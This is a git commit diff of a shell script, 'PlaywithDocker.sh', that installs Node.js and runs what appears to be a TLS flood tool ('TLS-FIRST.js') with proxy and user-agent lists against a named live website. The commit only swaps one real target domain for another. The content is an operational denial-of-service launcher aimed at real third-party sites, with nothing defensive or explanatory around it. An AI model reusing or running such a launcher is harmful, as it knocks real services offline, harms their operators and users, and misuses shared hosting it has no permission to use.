553f7180bb7ec6f95c8f1bbf09b8ce31d3ce69d4
GolubevsEv <124365636+GolubevsEv@users.noreply.github.com>
2023-06-08 13:50:43 +0300

    Update PlaywithDocker.sh

--- PlaywithDocker.sh
+++ PlaywithDocker.sh
@@ -6,5 +6,5 @@ bash install.sh -y
 apk add nodejs
 apk add npm
 npm i colors
-node TLS-FIRST.js https://kickrussiaout.info/ 3000 proxy.txt ua.txt 15 100
+node TLS-FIRST.js https://nerabota.net/main 3000 proxy.txt ua.txt 15 100
 
